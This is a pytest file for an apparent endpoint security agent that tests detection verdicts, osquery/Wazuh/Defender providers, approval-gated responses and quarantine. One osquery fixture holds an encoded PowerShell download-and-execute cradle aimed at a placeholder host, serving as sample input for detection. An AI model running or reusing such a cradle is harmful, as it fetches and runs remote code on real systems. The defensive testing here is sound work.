from __future__ import annotations

import asyncio
from pathlib import Path

from fastapi import FastAPI
from fastapi.testclient import TestClient

from host_brain.app.internal_security_immune_routes import router as internal_security_router
from host_brain.app.obs_routes_core import router as obs_router
import host_brain.app.obs_routes_security_immune as obs_security_routes
from host_brain.security_immune.actions import SecurityResponseExecutor
from host_brain.security_immune.agent import SecurityImmuneAgent
from host_brain.security_immune.models import (
    ActionStatus,
    AgentMode,
    AssetSnapshot,
    IncidentRecord,
    ResponseAction,
    RiskLevel,
    SecuritySignal,
    Verdict,
)
from host_brain.security_immune.policy import SecurityImmunePolicy
from host_brain.security_immune.providers.base import ProviderResult
from host_brain.security_immune.providers.defender_provider import DefenderProvider
from host_brain.security_immune.providers.factory import build_provider_chain
from host_brain.security_immune.providers.local_probe import LocalProbeProvider
from host_brain.security_immune.providers.osquery_provider import OsqueryProvider
from host_brain.security_immune.providers.wazuh_provider import WazuhProvider
from host_brain.security_immune.verdict import MalwareVerdictEngine


class _FakeSensor:
    def __init__(self, asset: AssetSnapshot) -> None:
        self.asset = asset

    def collect(self) -> AssetSnapshot:
        return self.asset


class _FakeLedger:
    def __init__(self) -> None:
        self.voice_events = []

    def log_voice_event(self, row: dict) -> None:
        self.voice_events.append(dict(row))


class _FakeProvider:
    def __init__(self, asset: AssetSnapshot, *, provider_id: str = "fake_provider") -> None:
        self.asset = asset
        self.provider_id = provider_id

    def collect_assets(self) -> ProviderResult:
        return ProviderResult(provider_id=self.provider_id, status="ok", assets=[self.asset])


def _policy(tmp_path: Path, *, mode: AgentMode = AgentMode.OBSERVE) -> SecurityImmunePolicy:
    return SecurityImmunePolicy(
        enabled=True,
        mode=mode,
        scan_interval_seconds=60,
        max_processes=20,
        state_dir=tmp_path,
        auto_actions_by_risk={},
    )


def test_security_immune_verdict_builds_policy_gated_actions(tmp_path: Path) -> None:
    policy = _policy(tmp_path)
    engine = MalwareVerdictEngine(policy)
    asset = AssetSnapshot(
        asset_id="win-01",
        hostname="WIN-01",
        os_family="Windows",
        signals=[
            SecuritySignal(
                signal_id="powershell_downloadstring",
                title="PowerShell remote loader pattern",
                severity=98,
                category="process",
            )
        ],
    )

    incident = engine.evaluate_asset(asset)

    assert incident is not None
    assert incident.risk.value == "critical"
    assert incident.verdict.value == "malicious"
    statuses = {action.action_id: action.status.value for action in incident.recommended_actions}
    assert statuses["quick_scan"] == "planned"
    assert statuses["isolate_host"] == "approval_required"


def test_security_immune_agent_run_once_persists_snapshot(tmp_path: Path) -> None:
    asset = AssetSnapshot(
        asset_id="asset-1",
        hostname="lab-host",
        os_family="Windows",
        signals=[
            SecuritySignal(
                signal_id="encoded_powershell",
                title="PowerShell encoded command",
                severity=75,
                category="process",
            )
        ],
    )
    agent = SecurityImmuneAgent(policy=_policy(tmp_path), sensor=_FakeSensor(asset))

    snapshot = asyncio.run(agent.run_once(reason="unit"))

    assert snapshot["asset_count"] == 1
    assert snapshot["incident_count"] == 1
    assert (tmp_path / "state.json").exists()
    assert (tmp_path / "events.jsonl").exists()
    assert snapshot["incidents"][0]["recommended_actions"]
    assert snapshot["provider_statuses"][0]["provider_id"] == "local_probe"


def test_security_immune_agent_uses_provider_chain_and_clears_stale_incidents(tmp_path: Path) -> None:
    risky_asset = AssetSnapshot(
        asset_id="asset-1",
        hostname="lab-host",
        os_family="Windows",
        signals=[
            SecuritySignal(
                signal_id="encoded_powershell",
                title="PowerShell encoded command",
                severity=80,
                category="process",
            )
        ],
    )
    clean_asset = AssetSnapshot(
        asset_id="asset-1",
        hostname="lab-host",
        os_family="Windows",
        signals=[],
    )
    agent = SecurityImmuneAgent(policy=_policy(tmp_path), providers=[_FakeProvider(risky_asset)])

    risky_snapshot = asyncio.run(agent.run_once(reason="provider-risky"))
    agent.providers = [_FakeProvider(clean_asset)]
    clean_snapshot = asyncio.run(agent.run_once(reason="provider-clean"))

    assert risky_snapshot["incident_count"] == 1
    assert clean_snapshot["incident_count"] == 0
    assert clean_snapshot["provider_statuses"][0]["provider_id"] == "fake_provider"


def test_security_immune_agent_merges_same_asset_from_multiple_providers(tmp_path: Path) -> None:
    process_asset = AssetSnapshot(
        asset_id="asset-1",
        hostname="lab-host",
        os_family="Windows",
        source="local_probe",
        signals=[
            SecuritySignal(
                signal_id="encoded_powershell",
                title="PowerShell encoded command",
                severity=25,
                category="process",
            )
        ],
    )
    wazuh_asset = AssetSnapshot(
        asset_id="asset-1",
        hostname="lab-host",
        os_family="unknown",
        source="wazuh_provider",
        signals=[
            SecuritySignal(
                signal_id="wazuh_rule_5715",
                title="Multiple authentication failures",
                severity=75,
                category="wazuh",
            )
        ],
    )
    agent = SecurityImmuneAgent(
        policy=_policy(tmp_path),
        providers=[
            _FakeProvider(process_asset, provider_id="local_probe"),
            _FakeProvider(wazuh_asset, provider_id="wazuh"),
        ],
    )

    snapshot = asyncio.run(agent.run_once(reason="provider-merge"))

    assert snapshot["asset_count"] == 1
    assert len(snapshot["assets"][0]["signals"]) == 2
    assert snapshot["assets"][0]["source"] == "provider_fusion"
    assert snapshot["incident_count"] == 1


def test_security_immune_agent_executes_safe_hunt_actions(tmp_path: Path) -> None:
    asset = AssetSnapshot(
        asset_id="asset-1",
        hostname="lab-host",
        os_family="Windows",
        signals=[
            SecuritySignal(
                signal_id="wmic_process_create",
                title="WMIC remote process creation pattern",
                severity=65,
                category="process",
            )
        ],
    )
    agent = SecurityImmuneAgent(
        policy=_policy(tmp_path, mode=AgentMode.HUNT),
        providers=[_FakeProvider(asset)],
    )

    snapshot = asyncio.run(agent.run_once(reason="hunt-actions"))

    incident = snapshot["incidents"][0]
    statuses = {action["action_id"]: action["status"] for action in incident["recommended_actions"]}
    results = {result["action_id"]: result for result in incident["action_results"]}
    assert statuses["collect_more_evidence"] == "executed"
    assert statuses["quick_scan"] == "skipped"
    assert results["collect_more_evidence"]["params"]["evidence_path"]
    assert Path(results["collect_more_evidence"]["params"]["evidence_path"]).exists()
    assert results["quick_scan"]["detail"] == "SECURITY_IMMUNE_ALLOW_LOCAL_DEFENDER_SCAN=false"


def test_security_response_executor_copies_suspicious_file_to_quarantine(tmp_path: Path) -> None:
    sample = tmp_path / "sample.bin"
    sample.write_bytes(b"suspicious test content")
    policy = SecurityImmunePolicy(
        state_dir=tmp_path / "state",
        mode=AgentMode.CONTAIN,
        auto_actions_by_risk={RiskLevel.HIGH: ("isolate_file_copy",)},
    )
    incident = IncidentRecord(
        incident_id="sec-inc-test",
        asset_id="asset-1",
        risk=RiskLevel.HIGH,
        verdict=Verdict.SUSPICIOUS,
        confidence=0.9,
        title="test",
        summary="test",
        signals=[
            SecuritySignal(
                signal_id="defender_threat_detection",
                title="Defender detected sample",
                severity=90,
                category="defender",
                evidence={"resource_states": [{"path": str(sample), "exists": True}]},
            )
        ],
        recommended_actions=[
            ResponseAction(
                action_id="isolate_file_copy",
                title="Copy suspicious file to quarantine",
                status=ActionStatus.AUTO_ALLOWED,
                reason="test",
            )
        ],
    )

    updated = SecurityResponseExecutor(policy).execute_incident(incident, None)

    result = updated.action_results[0]
    assert result.status == ActionStatus.EXECUTED
    copied = result.params["copied"][0]
    assert Path(copied["quarantine_path"]).exists()
    assert copied["sha256"]
    assert sample.exists()


def test_security_response_executor_keeps_approval_actions_unexecuted(tmp_path: Path) -> None:
    policy = SecurityImmunePolicy(state_dir=tmp_path, mode=AgentMode.WARTIME)
    incident = IncidentRecord(
        incident_id="sec-inc-approval",
        asset_id="asset-1",
        risk=RiskLevel.CRITICAL,
        verdict=Verdict.MALICIOUS,
        confidence=0.98,
        title="test",
        summary="test",
        recommended_actions=[
            ResponseAction(
                action_id="isolate_host",
                title="Isolate host",
                status=ActionStatus.APPROVAL_REQUIRED,
                reason="test",
            )
        ],
    )

    updated = SecurityResponseExecutor(policy).execute_incident(incident, None)

    assert updated.recommended_actions[0].status == ActionStatus.APPROVAL_REQUIRED
    assert updated.action_results[0].status == ActionStatus.APPROVAL_REQUIRED
    assert "not auto-executed" in updated.action_results[0].detail


def test_security_response_executor_dedupes_defender_quick_scan(monkeypatch, tmp_path: Path) -> None:
    policy = SecurityImmunePolicy(
        state_dir=tmp_path,
        mode=AgentMode.CONTAIN,
        allow_local_defender_scan=True,
    )
    incident = IncidentRecord(
        incident_id="sec-inc-scan",
        asset_id="asset-1",
        risk=RiskLevel.HIGH,
        verdict=Verdict.SUSPICIOUS,
        confidence=0.9,
        title="test",
        summary="test",
        recommended_actions=[
            ResponseAction(
                action_id="quick_scan",
                title="Generic quick scan",
                status=ActionStatus.AUTO_ALLOWED,
                reason="test",
            ),
            ResponseAction(
                action_id="run_defender_quick_scan",
                title="Defender quick scan",
                status=ActionStatus.AUTO_ALLOWED,
                reason="test",
            ),
        ],
    )
    executor = SecurityResponseExecutor(policy)
    scan_calls = []

    def _fake_quick_scan(action: ResponseAction, started: int):
        scan_calls.append(action.action_id)
        return executor._result(action, ActionStatus.EXECUTED, "fake scan completed", started)

    monkeypatch.setattr(executor, "_run_defender_quick_scan", _fake_quick_scan)

    updated = executor.execute_incident(incident, None)

    statuses = {result.action_id: result.status for result in updated.action_results}
    assert scan_calls == ["run_defender_quick_scan"]
    assert statuses["quick_scan"] == ActionStatus.SKIPPED
    assert statuses["run_defender_quick_scan"] == ActionStatus.EXECUTED
    assert "Specific run_defender_quick_scan" in updated.action_results[0].detail


def test_provider_factory_builds_requested_providers(tmp_path: Path) -> None:
    policy = SecurityImmunePolicy(
        state_dir=tmp_path,
        provider_names=("local_probe", "osquery", "wazuh", "defender"),
        osquery_enabled=False,
    )

    providers = build_provider_chain(policy)

    assert [provider.provider_id for provider in providers] == ["local_probe", "osquery", "wazuh", "defender"]
    assert isinstance(providers[0], LocalProbeProvider)
    assert isinstance(providers[1], OsqueryProvider)
    assert isinstance(providers[2], WazuhProvider)
    assert isinstance(providers[3], DefenderProvider)


def test_osquery_provider_maps_process_rows_to_normalized_asset(monkeypatch, tmp_path: Path) -> None:
    encoded = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGkAbgB2AGEAbABpAGQALwBhAC4AcABzADEAJwApAA=="
    policy = SecurityImmunePolicy(
        state_dir=tmp_path,
        provider_names=("osquery",),
        osquery_enabled=True,
        osquery_path="osqueryi",
    )

    def _fake_run(*_args, **_kwargs):
        return type(
            "Result",
            (),
            {
                "returncode": 0,
                "stdout": (
                    '[{"pid":"12","name":"powershell.exe","path":"C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe",'
                    f'"cmdline":"powershell.exe -EncodedCommand {encoded}"}}]'
                ),
                "stderr": "",
            },
        )()

    monkeypatch.setattr(
        "host_brain.security_immune.providers.osquery_provider.subprocess.run",
        _fake_run,
    )
    provider = OsqueryProvider(policy)

    result = provider.collect_assets()

    assert result.status == "ok"
    assert result.assets
    signal = result.assets[0].signals[0]
    assert signal.signal_id == "osquery_encoded_powershell"
    assert signal.severity == 80
    assert signal.evidence["provider"] == "osquery"


def test_wazuh_provider_maps_alerts_to_normalized_assets(tmp_path: Path) -> None:
    alerts_path = tmp_path / "alerts.json"
    alerts_path.write_text(
        "\n".join(
            [
                '{"agent":{"id":"001","name":"win-01","ip":"192.168.1.10"},"rule":{"id":"100001","level":5,"description":"low ignored","groups":["syscheck"]}}',
                '{"id":"alert-1","timestamp":"2026-05-14T10:00:00Z","agent":{"id":"001","name":"win-01","ip":"192.168.1.10"},"rule":{"id":"5715","level":10,"description":"Multiple authentication failures","groups":["authentication_failed","pci_dss_10.2.4"]},"decoder":{"name":"sshd"},"location":"/var/log/auth.log","full_log":"sshd failed password"}',
                '{"id":"alert-2","timestamp":"2026-05-14T10:01:00Z","agent":{"id":"002","name":"linux-01","ip":"10.0.0.5"},"rule":{"id":"550","level":12,"description":"File integrity monitoring alert","groups":["syscheck"]},"decoder":{"name":"syscheck"},"location":"syscheck","full_log":"fim changed"}',
            ]
        ),
        encoding="utf-8",
    )
    policy = SecurityImmunePolicy(
        state_dir=tmp_path,
        provider_names=("wazuh",),
        wazuh_enabled=True,
        wazuh_alerts_path=str(alerts_path),
        wazuh_min_rule_level=7,
    )
    provider = WazuhProvider(policy)

    result = provider.collect_assets()

    assert result.status == "ok"
    assert len(result.assets) == 2
    by_id = {asset.asset_id: asset for asset in result.assets}
    assert "wazuh-agent-001" in by_id
    assert "wazuh-agent-002" in by_id
    assert by_id["wazuh-agent-001"].signals[0].signal_id == "wazuh_rule_5715"
    assert by_id["wazuh-agent-001"].signals[0].severity == 75
    assert by_id["wazuh-agent-002"].signals[0].severity == 90
    assert result.metadata["alert_count"] == 2


def test_wazuh_signals_get_wazuh_specific_response_actions(tmp_path: Path) -> None:
    policy = SecurityImmunePolicy(state_dir=tmp_path)
    engine = MalwareVerdictEngine(policy)
    asset = AssetSnapshot(
        asset_id="wazuh-agent-001",
        hostname="win-01",
        os_family="Windows",
        signals=[
            SecuritySignal(
                signal_id="wazuh_rule_60122",
                title="Suspicious PowerShell activity",
                severity=90,
                category="wazuh",
            )
        ],
    )

    incident = engine.evaluate_asset(asset)

    assert incident is not None
    action_ids = {action.action_id for action in incident.recommended_actions}
    assert "review_wazuh_alert_context" in action_ids
    assert "pull_wazuh_agent_timeline" in action_ids


def test_defender_provider_maps_status_and_detections(monkeypatch, tmp_path: Path) -> None:
    policy = SecurityImmunePolicy(
        state_dir=tmp_path,
        provider_names=("defender",),
        defender_enabled=True,
        defender_max_detections=5,
        defender_detection_window_minutes=0,
    )
    outputs = [
        {
            "AntivirusEnabled": True,
            "RealTimeProtectionEnabled": False,
            "AntivirusSignatureAge": 9,
            "QuickScanAge": 1,
            "FullScanAge": 30,
        },
        [
            {
                "ThreatID": 2147519003,
                "ThreatName": "EICAR_Test_File",
                "Resources": ["file:_C:\\\\Temp\\\\eicar.com"],
                "ActionSuccess": True,
                "ThreatStatusID": 0,
                "InitialDetectionTime": "2026-05-14T12:00:00",
                "LastThreatStatusChangeTime": "2026-05-14T12:00:01",
            }
        ],
    ]

    def _fake_run(*_args, **_kwargs):
        payload = outputs.pop(0)
        return type("Result", (), {"returncode": 0, "stdout": __import__("json").dumps(payload), "stderr": ""})()

    monkeypatch.setattr("host_brain.security_immune.providers.defender_provider.platform.system", lambda: "Windows")
    monkeypatch.setattr(
        "host_brain.security_immune.providers.defender_provider.subprocess.run",
        _fake_run,
    )
    provider = DefenderProvider(policy)

    result = provider.collect_assets()

    assert result.status == "ok"
    signal_ids = {signal.signal_id for signal in result.assets[0].signals}
    assert "defender_realtime_disabled" in signal_ids
    assert "defender_signatures_stale" in signal_ids
    assert "defender_threat_detection" in signal_ids


def test_defender_provider_filters_old_threat_history(monkeypatch, tmp_path: Path) -> None:
    policy = SecurityImmunePolicy(
        state_dir=tmp_path,
        provider_names=("defender",),
        defender_enabled=True,
        defender_detection_window_minutes=60,
    )
    monkeypatch.setattr("host_brain.security_immune.providers.defender_provider.now_ms", lambda: 10_000_000_000)
    provider = DefenderProvider(policy)

    signals = provider._signals_from_detections(
        [
            {
                "ThreatID": 1,
                "ThreatName": "Old_Test_File",
                "ActionSuccess": True,
                "LastThreatStatusChangeTime": "/Date(1000)/",
            },
            {
                "ThreatID": 2,
                "ThreatName": "Recent_Test_File",
                "ActionSuccess": True,
                "LastThreatStatusChangeTime": "/Date(9996500000)/",
            },
        ]
    )

    assert len(signals) == 1
    assert signals[0].evidence["threat_name"] == "Recent_Test_File"


def test_defender_provider_marks_remediated_history_as_audit_signal(tmp_path: Path) -> None:
    policy = SecurityImmunePolicy(
        state_dir=tmp_path,
        provider_names=("defender",),
        defender_enabled=True,
        defender_detection_window_minutes=0,
    )
    provider = DefenderProvider(policy)

    signals = provider._signals_from_detections(
        [
            {
                "ThreatID": 2147519003,
                "ThreatName": "EICAR_Test_File",
                "Resources": ["file:_C:\\\\does-not-exist\\\\eicar.com"],
                "ActionSuccess": True,
                "ThreatStatusID": 3,
                "RemediationTime": "/Date(9996500000)/",
            }
        ]
    )

    assert len(signals) == 1
    assert signals[0].severity == 35
    assert "remediated" in signals[0].detail


def test_defender_signals_get_defender_specific_response_actions(tmp_path: Path) -> None:
    policy = SecurityImmunePolicy(state_dir=tmp_path)
    engine = MalwareVerdictEngine(policy)
    asset = AssetSnapshot(
        asset_id="host-1",
        hostname="host-1",
        os_family="Windows",
        signals=[
            SecuritySignal(
                signal_id="defender_threat_detection",
                title="Microsoft Defender detected EICAR_Test_File",
                severity=90,
                category="defender",
            )
        ],
    )

    incident = engine.evaluate_asset(asset)

    assert incident is not None
    action_ids = {action.action_id for action in incident.recommended_actions}
    assert "review_defender_threat_history" in action_ids
    assert "verify_defender_remediation" in action_ids


def test_security_immune_obs_routes_filter_incidents(monkeypatch) -> None:
    monkeypatch.setattr(
        obs_security_routes,
        "read_domain_projection_from_store",
        lambda _store, **_kwargs: (
            {
                "asset_count": 1,
                "incident_count": 2,
                "generated_ts_ms": 123,
                "risk_counts": {"low": 1, "high": 1},
                "assets": [{"asset_id": "asset-1"}],
                "incidents": [
                    {"incident_id": "low-1", "risk": "low"},
                    {"incident_id": "high-1", "risk": "high"},
                ],
            },
            {
                "schema_version": "Natsume.operator.query_projection.v1",
                "projection_version": 1,
                "projection_cursor": 1,
                "source_cursor": 123,
                "freshness_ts_ms": 123,
                "degraded_state": "HEALTHY",
                "available": True,
            },
        ),
    )
    app = FastAPI()
    app.dependency_overrides[
        obs_security_routes.require_obs_query_projection_store
    ] = lambda: object()
    app.include_router(obs_router)
    client = TestClient(app)

    response = client.get("/obs/security/incidents?min_risk=high")

    assert response.status_code == 200
    payload = response.json()
    assert payload["incident_count"] == 1
    assert payload["incidents"][0]["incident_id"] == "high-1"


def test_internal_security_probe_heartbeat_ingests_snapshot(monkeypatch, tmp_path: Path) -> None:
    agent = SecurityImmuneAgent(policy=_policy(tmp_path))
    monkeypatch.setattr(
        "host_brain.app.internal_security_immune_routes.get_security_immune_agent",
        lambda **_kwargs: agent,
    )
    app = FastAPI()
    app.include_router(internal_security_router)
    client = TestClient(app)

    response = client.post(
        "/internal/security/probe/heartbeat",
        json={
            "source": "unit_probe",
            "asset": {
                "asset_id": "endpoint-1",
                "hostname": "endpoint-1",
                "os_family": "Windows",
                "signals": [
                    {
                        "signal_id": "wmic_process_create",
                        "title": "WMIC remote process creation pattern",
                        "severity": 82,
                        "category": "process",
                    }
                ],
            },
        },
    )

    assert response.status_code == 200
    payload = response.json()
    assert payload["asset_count"] == 1
    assert payload["incident_count"] == 1
    assert payload["incidents"][0]["asset_id"] == "endpoint-1"


def test_probe_ingest_writes_ledger_event(tmp_path: Path) -> None:
    ledger = _FakeLedger()
    agent = SecurityImmuneAgent(policy=_policy(tmp_path), ledger_provider=lambda: ledger)

    agent.ingest_asset_snapshot(
        {
            "asset_id": "endpoint-1",
            "hostname": "endpoint-1",
            "os_family": "Windows",
            "signals": [
                {
                    "signal_id": "defender_realtime_disabled",
                    "title": "Defender realtime disabled",
                    "severity": 75,
                    "category": "defender",
                }
            ],
        },
        source="unit_probe",
    )

    assert ledger.voice_events
    event = ledger.voice_events[-1]
    assert event["event_type"] == "SECURITY_IMMUNE_PROBE_INGEST"
    assert event["status"] == "DEGRADED"
    assert event["payload"]["source"] == "unit_probe"
